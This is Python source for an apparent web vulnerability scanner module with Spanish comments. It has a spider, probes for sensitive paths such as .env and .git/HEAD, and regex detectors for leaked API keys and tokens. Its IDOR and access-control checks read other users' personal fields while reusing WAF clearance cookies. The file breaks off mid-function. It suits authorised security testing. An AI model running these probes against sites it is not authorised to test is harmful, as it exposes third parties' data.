"""
codexRC - Hunter Module
Motor de descubrimiento (arana + inventario de parametros) y corpus de
pruebas XSS por reflexion. Diseno 100% pasivo del lado del atacante:
solo envia marcadores benignos (kxss...) y DEDUCE explotabilidad por
analisis de contexto. Nunca ejecuta JavaScript ni dispara payloads reales.
"""

from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse
import re
import json
import secrets
import time
import concurrent.futures

import requests
from bs4 import BeautifulSoup

Log = Callable[[str], None]

SKIP_EXT = (
    ".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg", ".ico", ".css",
    ".woff", ".woff2", ".ttf", ".otf", ".eot", ".mp4", ".mp3", ".mpd",
    ".pdf", ".zip", ".rar", ".7z", ".gz", ".tar", ".exe", ".apk", ".dmg",
)

JS_SINK_RE = re.compile(
    r"(innerHTML|outerHTML|document\.write|document\.writeln|"
    r"insertAdjacentHTML|\beval\s*\(|\.html\s*\()", re.I)
JS_SOURCE_RE = re.compile(
    r"(location\.(search|hash|href)|document\.(URL|referrer|documentURI)|"
    r"URLSearchParams|window\.name)", re.I)
JS_ENDPOINT_RE = re.compile(r"[\"'](/(?:api|v[0-9]|ajax|graphql|rest)[A-Za-z0-9_\-/\.]*)[\"']")
FORM_INPUT_TYPES = ("text", "search", "email", "url", "tel", "password", "number", "")


def _norm(url: str) -> str:
    p = urlparse(url)
    return urlunparse((p.scheme, p.netloc.lower(), p.path or "/", p.params, p.query, ""))


class Spider:
    """Arana del mismo origen: paginas, URLs con parametros, formularios,
    endpoints de API ocultos en JS y candidatos a XSS-DOM."""

    def __init__(self, session: requests.Session, timeout: float = 15.0):
        self.session = session
        self.timeout = timeout

    def _origin(self, url: str) -> Tuple[str, str]:
        p = urlparse(url)
        return (p.scheme, (p.hostname or "").lower())

    def _analyze_js(self, code: str, source: str, js_endpoints: Set[str],
                    dom_candidates: List[Dict[str, Any]]) -> None:
        for m in JS_ENDPOINT_RE.finditer(code or ""):
            js_endpoints.add(m.group(1))
        if code and JS_SINK_RE.search(code) and JS_SOURCE_RE.search(code):
            dom_candidates.append({
                "source": source,
                "sink": JS_SINK_RE.search(code).group(0),
                "source_pattern": JS_SOURCE_RE.search(code).group(0),
            })

    def run(self, url: str, log: Log, max_pages: int = 25,
            max_js_files: int = 15, seed_urls=None) -> Dict[str, Any]:
        origin = self._origin(url)
        queue: List[str] = [url]
        for s in (seed_urls or []):
            if _norm(s) not in [q for q in queue]:
                queue.append(s)
        visited: Set[str] = set()
        js_seen: Set[str] = set()
        js_endpoints: Set[str] = set()
        dom_candidates: List[Dict[str, Any]] = []
        forms: List[Dict[str, Any]] = []
        param_targets: List[Dict[str, Any]] = []
        seen_targets: Set[Tuple[str, str]] = set()
        pages: List[str] = []

        def add_param_target(u: str) -> None:
            for k, _v in parse_qsl(urlparse(u).query):
                key = (_norm(u), k)
                if key not in seen_targets:
                    seen_targets.add(key)
                    param_targets.append({"url": _norm(u), "param": k})

        cur_base: List[str] = [url]

        def enqueue(u: str) -> None:
            try:
                full = urljoin(cur_base[0], u)
            except Exception:
                return
            p = urlparse(full)
            if (p.scheme, (p.hostname or "").lower()) != origin:
                return
            if not p.scheme.startswith("http"):
                return
            path = (p.path or "").lower()
            if path.endswith(".js"):
                # los .js se analizan aparte (endpoints ocultos + chunks lazy);
                # nunca se encolan como pagina
                if len(js_seen) < max_js_files:
                    js_seen.add(_norm(full))
                return
            if path.endswith(SKIP_EXT):
                return
            add_param_target(full)
            if _norm(full) not in visited:
                queue.append(full)

        log(f"[spider] inicio sobre {urlparse(url).netloc} · limite {max_pages} paginas")

        # sitemap.xml como acelerador de descubrimiento
        try:
            r = self.session.get(urljoin(url, "/sitemap.xml"), timeout=self.timeout)
            if r.ok and "<" in r.text[:200]:
                found = 0
                for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", r.text)[:80]:
                    enqueue(loc)
                    found += 1
                if found:
                    log(f"[spider] sitemap.xml: {found} URLs descubiertas")
        except Exception:
            pass

        while queue and len(visited) < max_pages:
            cur = queue.pop(0)
            key = _norm(cur)
            if key in visited:
                continue
            visited.add(key)
            try:
                r = self.session.get(cur, timeout=self.timeout, allow_redirects=True)
            except Exception as exc:
                log(f"[spider] XX {urlparse(cur).path} · error de red: {str(exc)[:60]}")
                continue
            ct = (r.headers.get("content-type") or "").lower()
            path = urlparse(str(r.url)).path or "/"
            if "javascript" in ct:
                self._analyze_js(r.text, path, js_endpoints, dom_candidates)
                continue
            if "html" not in ct:
                continue
            pages.append(path)
            log(f"[spider] GET {path} ({r.status_code})")

            try:
                soup = BeautifulSoup(r.text, "html.parser")
            except Exception:
                continue

            # base href: los links relativos se resuelven contra esto
            cur_base[0] = str(r.url)
            for base_tag in soup.find_all("base", href=True):
                try:
                    cur_base[0] = urljoin(str(r.url), base_tag["href"])
                except Exception:
                    pass

            for a in soup.find_all("a", href=True):
                enqueue(a["href"])
            for f in soup.find_all("form"):
                action = urljoin(cur_base[0], f.get("action") or "")
                method = (f.get("method") or "get").lower()
                fields = []
                for inp in f.find_all(["input", "textarea"]):
                    name = inp.get("name")
                    if not name or inp.get("type") in ("submit", "button", "reset", "file", "image", "hidden"):
                        continue
                    if inp.name == "textarea" or (inp.get("type") or "text").lower() in FORM_INPUT_TYPES:
                        fields.append(name)
                if fields and action:
                    forms.append({"url": action, "method": method, "fields": fields[:10],
                                  "page": path})
                    log(f"[spider] form {method.upper()} {urlparse(action).path} · campos: {', '.join(fields[:5])}")

            for s in soup.find_all("script"):
                if s.get("src"):
                    enqueue(s["src"])
                else:
                    self._analyze_js(s.string or "", path, js_endpoints, dom_candidates)

        # archivos .js descubiertos: extraer endpoints
        for js in list(js_seen)[:max_js_files]:
            try:
                r = self.session.get(js, timeout=self.timeout)
                n0 = len(js_endpoints)
                self._analyze_js(r.text, urlparse(js).path, js_endpoints, dom_candidates)
                if len(js_endpoints) > n0:
                    log(f"[spider] JS {urlparse(js).path} · {len(js_endpoints) - n0} endpoints nuevos")
            except Exception:
                pass

        add_param_target(url)
        log(f"[spider] mapa listo · {len(pages)} paginas · {len(param_targets)} parametros "
            f"· {len(forms)} formularios · {len(js_endpoints)} endpoints API · "
            f"{len(dom_candidates)} candidatos DOM")

        return {
            "base_url": url,
            "pages": pages,
            "param_targets": param_targets,
            "forms": forms,
            "js_endpoints": sorted(js_endpoints)[:40],
            "js_files": sorted(js_seen)[:max_js_files],
            "dom_candidates": dom_candidates[:20],
        }


class DeepHunter:
    """Caza activa SEGURA (v0.15): fuerza superficie que el spider pasivo no ve.
    Tres baterias: rutas ocultas (detecta respuestas reales bajo shells SPA),
    BAC en APIs JSON (contraste logueado vs anonimo, lectura A->B) y descubrimiento
    de parametros no enlazados con nombres comunes.
    Reglas: solo GETs, marcadores canary inofensivos, nunca escribe en el blanco,
    nunca dispara payloads de exploit, nunca toca endpoints que modifiquen datos."""

    PATH_DICT = (
        "admin", "administrator", "panel", "dashboard", "cp", "cpanel",
        "login", "signin", "register", "logout",
        "api", "api/v1", "api/me", "api/account", "api/account/init",
        "api/user", "api/users", "api/profile", "api/settings", "api/config",
        "api/wallet", "api/balance", "api/transactions", "api/orders",
        "api/admin", "api/auth/me", "api/auth/session",
        "backup", "backups", "dump.sql", "db", "database",
        "uploads", "upload", "files", "storage", "media",
        "tmp", "temp", "test", "debug", "phpinfo", "status", "health",
        "config", "wp-admin", "wp-login.php",
        "robots.txt", "humans.txt", ".env", ".env.local", ".git/HEAD",
        "package.json", "composer.json",
    )

    SENSITIVE_PATHS = (
        "admin", "administrator", "panel", "dashboard", "cp", "cpanel",
        "backup", "backups", "dump.sql", "db", "database", "phpinfo",
        "debug", "test", "wp-admin", "wp-login.php",
    )

    API_DEFAULTS = (
        "api/me", "api/account", "api/account/init", "api/user", "api/users",
        "api/profile", "api/settings", "api/config", "api/wallet", "api/balance",
        "api/transactions", "api/orders", "api/admin", "api/auth/me",
        "api/auth/session", "api/v1/me", "api/v1/user", "api/v1/account",
        "api/user/profile", "api/customer", "api/customer/profile",
    )

    PARAM_NAMES = (
        "id", "uid", "user_id", "userId", "page", "q", "s", "search", "term",
        "name", "email", "phone", "sort", "order", "filter", "type", "view",
        "display", "lang", "locale", "currency", "redirect", "url", "next",
        "callback", "return", "ref", "from", "to", "date", "amount", "token",
    )

    PII_KEYS = (
        "email", "phone", "balance", "first_name", "last_name", "fullname",
        "passport", "address", "ssn", "card_number", "birthday", "birth_date",
        "password", "private_key", "wallet_address",
    )

    SECRET_MARKERS = ("API_KEY", "SECRET", "PASSWORD", "PRIVATE_KEY", "DB_PASS", "TOKEN=")
    SECRET_PATTERNS = (
        (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS Access Key"),
        (re.compile(r"ghp_[A-Za-z0-9]{20,}"), "GitHub token"),
        (re.compile(r"sk_live_[A-Za-z0-9]{16,}"), "Stripe secret key"),
        (re.compile(r"AIza[0-9A-Za-z_\-]{30,}"), "Google API key"),
        (re.compile(r"eyJ[A-Za-z0-9_\-]{15,}\.[A-Za-z0-9_\-]{15,}\.[A-Za-z0-9_\-]{10,}"),
         "JWT hardcodeado"),
        (re.compile(r"(?i)(api[_-]?key|secret|passwd|password|access[_-]?token)"
                    r"\s*[:=]\s*[\"\'][^\"\']{12,}[\"\']"), "credencial hardcodeada"),
    )

    def _scan_postmessage(self, text: str, source: str,
                          findings: List[Dict[str, Any]]) -> None:
        """Detecta listeners de postMessage sin validacion de origin (solo
        lectura estatica del JS: nunca envia mensajes ni payloads)."""
        for m in re.finditer(
                r"addEventListener\s*\(\s*[\"\']message[\"\']", text or ""):
            win = text[m.end(): m.end() + 400]
            has_origin = re.search(r"\b(e|ev|event|msg)\s*\.\s*origin\b|"
                                   r"[\"\']https?://", win)
            sinks = [s for s in ("innerHTML", "document.write", "eval(",
                                 "location.href", "location.assign",
                                 "insertAdjacentHTML", "srcdoc")
                     if s in win]
            if not has_origin:
                sev = "alta" if sinks else "media"
                ev = win[:120].replace("\n", " ").strip()
                findings.append({
                    "severity": sev,
                    "type": "postMessage XSS (listener sin origen)",
                    "param": "-", "target": source,
                    "evidence": f"listener de message sin chequeo de origin"
                                + (f" · sink cercano: {sinks[0]}" if sinks else "")
                                + f" · contexto: {ev[:80]}",
                    "verdict": "candidata postMessage XSS: revisar si el listener "
                               "escribe datos del mensaje en el DOM"})
                self.log(f"[api-js] 💥 postMessage sin origin en {urlparse(source).path}"
                         + (f" (sink: {sinks[0]})" if sinks else ""))
            break  # un reporte por archivo basta como inventario

    def _scan_secrets(self, text: str, source: str, findings: List[Dict[str, Any]]) -> None:
        """Busca credenciales/keys filtradas en JS publico (solo patrones de
        deteccion, nunca valida ni usa la credencial)."""
        for pat, label in self.SECRET_PATTERNS:
            m = pat.search(text or "")
            if not m:
                continue
            i = (text or "").find(m.group(0))
            ev = (text[max(0, i - 40): i + len(m.group(0)) + 40]
                  if i >= 0 else m.group(0)).replace("\n", " ").strip()
            findings.append({
                "severity": "media" if label == "credencial hardcodeada" else "alta",
                "type": "Secreto en JS publico",
                "param": "-", "target": source,
                "evidence": f"{label}: {ev[:180]}",
                "verdict": "revisar si la credencial es real y de que servicio"})
            self.log(f"[api-js] 💥 {label} en {urlparse(source).path}")
            break  # un hallazgo por archivo basta para el inventario

    def __init__(self, session: requests.Session, log: Log,
                 delay: float = 0.15, timeout: float = 15.0):
        self.session = session
        self.log = log
        self.delay = delay
        self.timeout = timeout
        self.api_specs: Dict[str, str] = {}

    def _pause(self) -> None:
        time.sleep(self.delay)

    def _pii_keys(self, text: str) -> list:
        """Nombres de campos personales presentes en un JSON (nunca los valores)."""
        keys = []
        low = text[:20000]
        for k in self.PII_KEYS:
            if f'"{k}"' in low or f"'{k}'" in low or f"{k}:" in low:
                keys.append(k)
        return keys[:6]


    # cookies de WAF/CDN que se conservan en el contraste anonimo
    WAF_COOKIE_PREFIXES = ("cf_", "__cf", "_cf", "__cfr", "akamai", "__ddg")

    def _anon_copy(self) -> requests.Session:
        """Copia de la sesion SIN cookies de aplicacion (auth) pero CON la
        clearance del WAF, para contrastar autorizacion real y no un bloqueo
        TLS. Si el WAF responde challenge, el contraste se marca no concluyente."""
        s = requests.Session()
        for c in self.session.cookies:
            if c.name.lower().startswith(self.WAF_COOKIE_PREFIXES):
                s.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
        for k, v in self.session.headers.items():
            if k.lower() not in ("cookie",):
                s.headers[k] = v
        return s

    def _waf_block(self, status: int, text: str) -> bool:
        if status not in (403, 429, 503):
            return False
        low = text[:600].lower()
        return any(x in low for x in ("cloudflare", "cf-ray", "challenge",
                                      "captcha", "ddos protection", "attention required"))

    def _ip_echo(self, text: str) -> bool:
        """True si el unico dato 'address' es el eco de la IP del cliente."""
        return bool(re.search(r'"address"\s*:\s*"?\d{1,3}(\.\d{1,3}){3}', text))

    def _pii(self, text: str) -> list:
        keys = self._pii_keys(text)
        if keys == ["address"] and self._ip_echo(text):
            return []
        return keys

    def _origin_headers(self, base_url: str) -> Dict[str, str]:
        """Cabeceras de navegador para POST de lectura (Origin/Referer/XHR)."""
        return {"Origin": base_url.rstrip("/"),
                "Referer": base_url.rstrip("/") + "/",
                "X-Requested-With": "XMLHttpRequest"}

    def _post_read(self, sess, u: str, payload=None):
        """POST de lectura (JSON vacio o con id vecino) contra un endpoint tipo
        getPage/init. Solo se invoca sobre rutas cuyo ultimo segmento NO empieza
        con 'do' (nunca escribe datos: los payloads son ids de lectura)."""
        return sess.post(u, json=(payload if payload is not None else {}),
                         timeout=self.timeout, allow_redirects=False)

    def _scan_js_text(self, base_url, text, specs, queue, seen_files):
        """Extrae chunks lazy y rutas API (con verbo) de un archivo JS."""
        for m in re.finditer(r'["' + "'" + r'`](chunk-[A-Z0-9]{6,12}\.js)["' + "'" + r'`]', text):
            cu = urljoin(base_url, "/" + m.group(1))
            if cu not in seen_files and len(seen_files) < 40:
                seen_files.add(cu)
                queue.append(cu)
        api_bases = [m.group(1) for m in
                     re.finditer(r'apiUrl\s*[:=]\s*["' + "'" + r'`](/api[^"' + "'" + r'`]*)["' + "'" + r'`]', text)]
        bases = api_bases or ["/api"]
        for m in re.finditer(r'\.(?:get|post)\(\s*["' + "'" + r'`](/[a-zA-Z0-9_][a-zA-Z0-9_/-]{2,70})["' + "'" + r'`]', text):
            route, is_get = m.group(1), m.group(0).startswith(".get")
            if route.rsplit("/", 1)[-1].startswith("do"):
                continue  # endpoint de escritura: jamas se toca
            for b in bases:
                u = urljoin(base_url, b.rstrip("/") + route)
                if u not in specs:
                    specs[u] = "GET" if is_get else "POST"
        for m in re.finditer(r'["' + "'" + r'`](/(?:api|account|auth|user|wallet|settings|balance|payment|referral|dashboard)/[a-zA-Z0-9_/-]{2,60})["' + "'" + r'`]', text):
            route = m.group(1)
            if route.rsplit("/", 1)[-1].startswith("do"):
                continue
            u = urljoin(base_url, route)
            if u not in specs:
                specs[u] = "POST"

    def discover_api_from_js(self, base_url: str, js_urls: List[str]):
        """Baja los bundles JS CON SESION HEREDADA, sigue los chunks lazy de
        Angular/webpack recursivamente y extrae las rutas API reales con su
        verbo. Los endpoints de escritura (do*) se excluyen siempre.
        Devuelve (findings, hits). El verbo queda en self.api_specs."""
        findings: List[Dict[str, Any]] = []
        specs: Dict[str, str] = {}
        queue: List[str] = []
        seen_files: Set[str] = set()
        for js in list(js_urls)[:15]:
            if js not in seen_files:
                seen_files.add(js)
                queue.append(js)
        while queue and len(seen_files) < 40:
            js = queue.pop(0)
            self._pause()
            try:
                r = self.session.get(js, timeout=self.timeout)
            except Exception:
                continue
            if r.status_code != 200 or len(r.text) < 50:
                continue
            self._scan_js_text(base_url, r.text, specs, queue, seen_files)
            self._scan_secrets(r.text, js, findings)
            self._scan_postmessage(r.text, js, findings)
        self.api_specs.update(specs)
        hits = list(specs.keys())[:40]
        if hits:
            self.log(f"[api-js] {len(seen_files)} archivos JS analizados "
                     f"(incl. chunks lazy) -> {len(hits)} rutas API:")
            for h in hits[:12]:
                self.log(f"[api-js]   [{specs[h]}] {urlparse(h).path}")
        else:
            self.log(f"[api-js] {len(seen_files)} archivos JS analizados, "
                     f"sin rutas API nuevas")
        return findings, hits

    def test_csp(self, base_url: str) -> List[Dict[str, Any]]:
        """Lee la cabecera CSP del objetivo y marca configuraciones debiles
        (solo lectura de cabeceras, cero payloads)."""
        findings: List[Dict[str, Any]] = []
        self._pause()
        try:
            r = self.session.get(base_url, timeout=self.timeout, allow_redirects=True)
        except Exception:
            self.log("[csp] sin respuesta del objetivo")
            return findings
        csp = r.headers.get("content-security-policy") or ""
        csp_ro = r.headers.get("content-security-policy-report-only") or ""
        xfo = (r.headers.get("x-frame-options") or "").lower()
        if not csp:
            findings.append({
                "severity": "media", "type": "Bypass de CSP (ausente)",
                "param": "-", "target": base_url,
                "evidence": "sin cabecera Content-Security-Policy"
                            + (" (solo report-only presente)" if csp_ro else ""),
                "verdict": "sin CSP: cualquier XSS reflejado/DOM se ejecuta sin freno"})
            self.log("[csp] 💥 el objetivo NO tiene CSP" +
                     (" (solo report-only)" if csp_ro else ""))
            return findings
        self.log(f"[csp] analizando CSP ({len(csp)} caracteres)")
        weak = []
        for pat, why in (
                (r"script-src[^;]*'unsafe-inline'", "script-src permite unsafe-inline"),
                (r"script-src[^;]*'unsafe-eval'", "script-src permite unsafe-eval"),
                (r"script-src[^;]*\*", "script-src con wildcard *"),
                (r"script-src[^;]*https?://\*\.", "script-src con dominio wildcard"),
                (r"default-src[^;]*'unsafe-inline'", "default-src permite unsafe-inline"),
                (r"default-src[^;]*\*", "default-src con wildcard *"),
                (r"(?!.*(script-src|default-src))", "sin directiva script-src ni default-src"),
        ):
            if pat == r"(?!.*(script-src|default-src))":
                if "script-src" not in csp and "default-src" not in csp:
                    weak.append(why)
            elif re.search(pat, csp):
                weak.append(why)
        if weak:
            findings.append({
                "severity": "alta" if any("unsafe-inline" in w for w in weak) else "media",
                "type": "Bypass de CSP (configuracion debil)",
                "param": "-", "target": base_url,
                "evidence": "; ".join(weak[:4])
                            + f" · x-frame-options: {xfo or 'ausente'}",
                "verdict": "CSP debil: un XSS puede ejecutarse dentro de estas reglas"})
            self.log(f"[csp] 💥 CSP debil: {'; '.join(weak[:3])}")
        else:
            findings.append({
                "severity": "info", "type": "CSP presente",
                "param": "-", "target": base_url,
                "evidence": f"{csp[:180]}",
                "verdict": "CSP estricta aparente"})
            self.log("[csp] CSP estricta: sin reglas debiles obvias")
        return findings

    def test_idor(self, base_url: str, api_hits: List[str]):
        """Bateria IDOR (lectura A->B): sobre endpoints API que responden con
        sesion, prueba identificadores vecinos (id=1,2, path numerico) buscando
        datos privados de OTROS usuarios. Solo GETs: nunca escribe ni modifica."""
        findings: List[Dict[str, Any]] = []
        probes_done = 0
        base = list(api_hits) + [urljoin(base_url, "/" + a) for a in self.API_DEFAULTS]
        # rutas reales descubiertas en los chunks JS primero; genericas al final
        cands = sorted(dict.fromkeys(base),
                       key=lambda u: 0 if u in self.api_specs else 1)[:20]
        if not cands:
            self.log("[idor] sin endpoints API para probar IDOR")
            return findings
        self.log(f"[idor] probando lectura A->B (ids vecinos) en {len(cands)} endpoints")
        for u in cands:
            self._pause()
            verb = self.api_specs.get(u, "GET")
            try:
                if verb == "POST":
                    rb = self._post_read(self.session, u)
                else:
                    rb = self.session.get(u, timeout=self.timeout, allow_redirects=False)
            except Exception:
                continue
            if urlparse(u).path.rstrip("/").rsplit("/", 1)[-1].startswith("do"):
                continue  # escritura: fuera
            if rb.status_code != 200 or "json" not in (rb.headers.get("content-type") or "").lower():
                continue
            try:
                base_json = json.loads(rb.text)
            except Exception:
                base_json = None
            base_pii = self._pii(rb.text)
            base_email = self._json_find(base_json, ("email", "username", "first_name"))
            # variante 1: path con id numerico -> vecino
            m = re.search(r"/(\d+)(/?)$", u)
            path_variants = []
            if m and int(m.group(1)) != 1:
                path_variants.append(re.sub(r"/\d+(/?)$", "/1\\1", u))
            # variante 2: parametros id/user_id en la URL
            param_variants = []
            sep = "&" if "?" in u else "?"
            for p in ("id", "user_id", "uid", "user"):
                for v in ("1", "2"):
                    param_variants.append(f"{u}{sep}{p}={v}")
            # variante 3 (POST): id vecino DENTRO del body JSON (patron SPA/Angular)
            def _plabel(pv):
                return (urlparse(pv).query
                        or re.sub(r"/\d+(/?)$", "/<id>", urlparse(pv).path) or "-")
            probes = []
            if verb == "POST":
                for p in ("id", "user_id", "userId", "account", "user"):
                    probes.append((f"body:{p}=1", ("body", u, {p: 1})))
                probes += [(_plabel(pv), ("url", pv, None)) for pv in param_variants]
            else:
                probes = [(_plabel(pv), ("url", pv, None))
                          for pv in path_variants + param_variants]
            for label, spec in probes:
                if probes_done >= 150:
                    break
                probes_done += 1
                self._pause()
                try:
                    if spec[0] == "body":
                        rp = self._post_read(self.session, spec[1], spec[2])
                    elif verb == "POST":
                        rp = self._post_read(self.session, spec[1])
                    else:
                        rp = self.session.get(spec[1], timeout=self.timeout, allow_redirects=False)
                except Exception:
                    continue
                if rp.status_code != 200:
                    continue
                if self._waf_block(rp.status_code, rp.text):
                    continue
                pii_p = self._pii(rp.text)
                if not pii_p:
                    continue
                try:
                    pj = json.loads(rp.text)
                except Exception:
                    pj = None
                p_email = self._json_find(pj, ("email", "username", "first_name"))
                if base_pii and p_email and p_email == base_email:
                    continue  # mismo usuario, el endpoint ignoro el id
                findings.append({
                    "severity": "alta", "type": "IDOR (lectura A->B)",
                    "param": label.replace("body:", "body ").replace("=1", ""),
                    "target": spec[1],
                    "evidence": f"datos privados de otro registro (campos: {', '.join(pii_p)})"
                                + (f" · identidad: {p_email}" if p_email else ""),
                    "verdict": "candidata IDOR: confirmar identidad ajena",
                    "leak": True, "leak_fields": pii_p, "leak_identity": p_email})
                self.log(f"[idor] 💥 posible IDOR en {urlparse(spec[1]).path}"
                         + (f"?{urlparse(spec[1]).query}" if urlparse(spec[1]).query else "")
                         + f" ({', '.join(pii_p)})")
        if probes_done:
            self.log(f"[idor] {probes_done} sondas de lectura A->B completadas")
        return findings

    @staticmethod
    def _json_find(obj, keys: tuple):
        """Busca el primer valor de las claves dadas en un JSON anidado."""
        if not isinstance(obj, (dict, list)):
            return None
        stack = [obj]
        while stack:
            cur = stack.pop()
            if isinstance(cur, dict):
                for k, v in cur.items():
                    if k in keys and isinstance(v, str) and v:
                        return v
                    stack.append(v)
            elif isinstance(cur, list):
                stack.extend(cur)
        return None

    def test_paths(self, base_url: str):
        """Sondea el diccionario de rutas. Detecta (1) respuestas reales distintas
        del shell SPA, (2) APIs JSON expuestas, (3) rutas protegidas,
        (4) secretos accesibles (.env/.git) sin mostrar sus valores.
        Devuelve (findings, api_hits)."""
        findings: List[Dict[str, Any]] = []
        api_hits: List[str] = []
        self.log(f"[paths] sondeando {len(self.PATH_DICT)} rutas comunes "
                 f"(GETs de lectura, contraste con shell)")
        # huella del shell: sitios SPA sirven el mismo HTML para toda ruta
        shell_len = None
        try:
            r = self.session.get(base_url, timeout=self.timeout, allow_redirects=True)
            if "html" in (r.headers.get("content-type") or "").lower():
                shell_len = len(r.text)
        except Exception:
            pass
        for p in self.PATH_DICT:
            u = urljoin(base_url, "/" + p)
            self._pause()
            try:
                r = self.session.get(u, timeout=self.timeout, allow_redirects=False)
            except Exception:
                continue
            ct = (r.headers.get("content-type") or "").lower()
            if r.status_code in (404, 410, 405):
                continue
            # --- APIs JSON expuestas: alimento de la bateria BAC ---
            if r.status_code == 200 and "json" in ct:
                api_hits.append(u)
                self.log(f"[paths] 💥 API JSON accesible: /{p}")
                continue
            # --- secretos y backups accesibles (solo presencia, sin valores) ---
            if p.startswith(".env") and r.status_code == 200 and any(
                    m in r.text[:4000].upper() for m in self.SECRET_MARKERS):
                findings.append({"severity": "alta", "type": "Exposicion de secretos",
                                 "param": "-", "target": u,
                                 "evidence": ".env accesible con marcadores de credenciales "
                                             "(valores NO extraidos)",
                                 "verdict": "confirmada por lectura, no se exfiltra contenido"})
                self.log(f"[paths] 💥 .env accesible en /{p} (valores no extraidos)")
                continue
            if p == ".git/HEAD" and r.status_code == 200 and "ref:" in r.text[:120]:
                findings.append({"severity": "alta", "type": "Repositorio .git expuesto",
                                 "param": "-", "target": u,
                                 "evidence": ".git/HEAD legible",
                                 "verdict": "confirmada por lectura"})
                self.log(f"[paths] 💥 .git expuesto")
                continue
            if r.status_code in (401, 403) and p in self.SENSITIVE_PATHS:
                findings.append({"severity": "info", "type": "Ruta protegida",
                                 "param": "-", "target": u,
                                 "evidence": f"responde {r.status_code} (existe, acceso negado)",
                                 "verdict": "mapeada"})
                self.log(f"[paths] ruta protegida existe: /{p} ({r.status_code})")
                continue
            # --- superficie real bajo shell SPA ---
            if r.status_code == 200 and "html" in ct:
                if shell_len and abs(len(r.text) - shell_len) < 300:
                    continue  # mismo shell: ruta client-side, nada nuevo del lado servidor
                if p in self.SENSITIVE_PATHS or p in ("api", "config", "status", "health"):
                    findings.append({"severity": "info", "type": "Superficie real",
                                     "param": "-", "target": u,
                                     "evidence": "HTML distinto al shell principal "
                                                 f"({len(r.text)} vs {shell_len or '?'} bytes)",
                                     "verdict": "mapeada para baterias"})
                self.log(f"[paths] superficie real: /{p} (HTML distinto al shell)")
                continue
        if api_hits:
            self.log(f"[paths] {len(api_hits)} endpoints API listos para contraste BAC")
        else:
            self.log("[paths] sin APIs JSON a la vista en rutas comunes")
        return findings, api_hits

    def test_api(self, base_url: str, api_hits: List[str]):
        """Contraste BAC sobre endpoints API: GET logueado vs GET anonimo.
        Lee A->B: si el anonimo recibe datos privados que exigen sesion = BAC.
        Nunca llama endpoints que modifiquen datos (do*, post, delete)."""
        findings: List[Dict[str, Any]] = []
        cands, seen = [], set()
        for u in list(api_hits) + [urljoin(base_url, "/" + a) for a in self.API_DEFAULTS]:
            if u not in seen:
                seen.add(u)
                cands.append(u)
        self.log(f"[api] contraste BAC en {min(len(cands), 30)} endpoints "
                 f"(con sesion vs anonimo, solo GETs)")
        for u in cands[:30]:
            self._pause()
            verb = self.api_specs.get(u, "GET")
            try:
                ra = self.session.get(u, timeout=self.timeout, allow_redirects=False)
                if ra.status_code in (404, 405) and verb == "POST":
                    for k, v in self._origin_headers(base_url).items():
                        self.session.headers.setdefault(k, v)
                    ra = self._post_read(self.session, u)
            except Exception:
                continue
            if ra.status_code != 200:
                if ra.status_code in (401, 403):
                    self.log(f"[api] /{urlparse(u).path} exige sesion (correcto)")
                continue
            pii_a = self._pii(ra.text)
            # contraste anonimo: sesion sin cookies de aplicacion (con clearance WAF)
            self._pause()
            try:
                anon = self._anon_copy()
                for k, v in self._origin_headers(base_url).items():
                    anon.headers.setdefault(k, v)
                if verb == "POST":
                    rn = self._post_read(anon, u)
                else:
                    rn = anon.get(u, timeout=self.timeout, allow_redirects=False)
                anon_ok = rn.status_code == 200
                pii_n = self._pii(rn.text) if anon_ok else []
                anon_waf = (not anon_ok) and self._waf_block(rn.status_code, rn.text)
            except Exception:
                anon_ok, pii_n, anon_waf = False, [], False
            if anon_ok and pii_n:
                findings.append({
                    "severity": "alta", "type": "BAC en API",
                    "param": "-", "target": u,
                    "evidence": f"responde datos privados SIN sesion "
                                f"(campos: {', '.join(pii_n)})",
                    "verdict": "confirmado por contraste anonimo",
                    "leak": True, "leak_fields": pii_n,
                    "leak_identity": self._json_find(json.loads(pii_n and rn.text or "{}"), ("email", "username", "first_name"))})
                self.log(f"[api] 💥 BAC: {urlparse(u).path} entrega datos privados "
                         f"SIN sesion ({', '.join(pii_n)})")
            elif anon_ok:
                findings.append({"severity": "info", "type": "API publica",
                                 "param": "-", "target": u,
                                 "evidence": "200 anonimo sin campos privados",
                                 "verdict": "mapeada"})
                self.log(f"[api] API publica: {urlparse(u).path}")
            elif anon_waf:
                self.log(f"[api] /{urlparse(u).path} contraste NO concluyente: "
                         f"el WAF bloqueo al anonimo (refinar con GHOSTGATE)")
            elif pii_a:
                self.log(f"[api] API privada correcta: {urlparse(u).path} "
                         f"(datos solo con sesion: {', '.join(pii_a)})")
                findings.append({"severity": "info", "type": "API privada mapeada",
                                 "param": "-", "target": u,
                                 "evidence": f"campos personales con sesion: "
                                             f"{', '.join(pii_a)}",
                                 "verdict": "mapeada"})
            # reflejo de marcador en la respuesta (posible inyeccion si se renderiza)
            self._pause()
            mark = "kapi" + secrets.token_hex(4) + "z"
            try:
                rc = self.session.get(u + ("&" if "?" in u else "?") + "__cx=" + mark,
                                      timeout=self.timeout, allow_redirects=False)
                if rc.status_code == 200 and mark in rc.text:
                    findings.append({"severity": "baja", "type": "Reflejo en API",
                                     "param": "__cx", "target": u,
                                     "evidence": "marcador reflejado en respuesta",
                                     "verdict": "candidata si el JSON se renderiza"})
                    self.log(f"[api] reflejo de marcador en {urlparse(u).path}")
            except Exception:
                pass
        return findings

    def discover_hidden_params(self, base_url: str, pages: List[str]) -> list:
        """Genera objetivos de parametros ocultos: nombres comunes (id, user_id,
        redirect, token...) sobre las paginas mas dinamicas del sitio."""
        dyn = []
        for pg in pages[:25]:
            u = urljoin(base_url, pg)
            self._pause()
            try:
                r = self.session.get(u, timeout=self.timeout, allow_redirects=True)
                if "html" not in (r.headers.get("content-type") or "").lower():
                    continue
                score = sum(r.text.count(x) for x in
                           ("<form", "<input", "api", "fetch(", "XMLHttpRequest",
                            "ng-", "v-if", "useState"))
                if score > 0:
                    dyn.append((score, str(r.url).split("?")[0]))
            except Exception:
                continue
        dyn.sort(reverse=True)
        chosen = [u for _s, u in dyn[:4]]
        if not chosen:
            self.log("[params+] sin paginas dinamicas para forzar parametros")
            return []
        targets = []
        for u in chosen:
            for name in self.PARAM_NAMES:
                targets.append({"url": u, "param": name})
